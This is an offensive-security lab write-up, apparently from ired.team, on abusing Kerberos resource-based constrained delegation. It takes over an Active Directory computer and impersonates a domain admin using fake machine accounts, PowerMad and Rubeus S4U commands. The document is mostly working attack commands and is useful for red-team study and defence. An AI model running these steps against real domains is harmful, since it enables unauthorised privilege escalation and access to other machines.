# Kerberos Resource-based Constrained Delegation: Computer Object Takeover

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

## Overview

It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.

High level overview of the attack:
- Code execution on WS02 as `offense\sandy`
- User `sandy` has WRITE privilege over target computer WS01
- `sandy` creates new computer object `FAKE01` in AD (no admin required)
- Leverage WRITE on WS01 to update `msDS-AllowedToActOnBehalfOfOtherIdentity` so FAKE01 can impersonate any domain user against WS01
- Request Kerberos tickets for `FAKE01$` impersonating `offense\spotless` (DA)
- Access c$ share of WS01 from WS02

### Kerberos Delegation vs Resource Based Kerberos Delegation

- Unconstrained/Constrained: computer/user is told what resources it can delegate to
- Resource-based: computers (resources) specify who they trust and who can delegate to them

## Requirements

| Item | Value |
|------|-------|
| Target computer | WS01 |
| Admins on target | spotless@offense.local |
| Fake computer | FAKE01 |
| Fake computer password | 123456 |
| DC | DC01 (Windows 2012+) |

Check ms-ds-machineaccountquota (default allows up to 10 computer accounts per domain user):
```
Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties ms-ds-machineaccountquota
```

## Steps

### 1. Create a new Computer Object
```powershell
# PowerMad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force)
```

Get SID of FAKE01:
```powershell
Get-ADComputer FAKE01
```

### 2. Create Security Descriptor for FAKE01
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<FAKE01-SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

### 3. Modify Target Computer's AD Object
```powershell
Get-ADComputer WS01 | Set-ADObject -Replace @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

### 4. Generate RC4 Hash of FAKE01 Password
```powershell
Rubeus.exe hash /password:123456
```

### 5. Request Impersonation Ticket
```powershell
# Use SHORT SPN (cifs/ws01, NOT cifs/ws01.offense.local)
Rubeus.exe s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:spotless /msdsspn:cifs/ws01 /ptt
```

**Important**: Use `cifs/ws01` (short name), NOT `cifs/ws01.offense.local` — the FQDN form fails.

### 6. Verify Access
```
dir \ws01\c$
```

## Notes
- Attack is scoped to WS01 only — spotless rights only effective on the delegating computer
- Requires Windows 2012+ DC
- `msDS-AllowedToActOnBehalfOfOtherIdentity` must be empty on target before attack
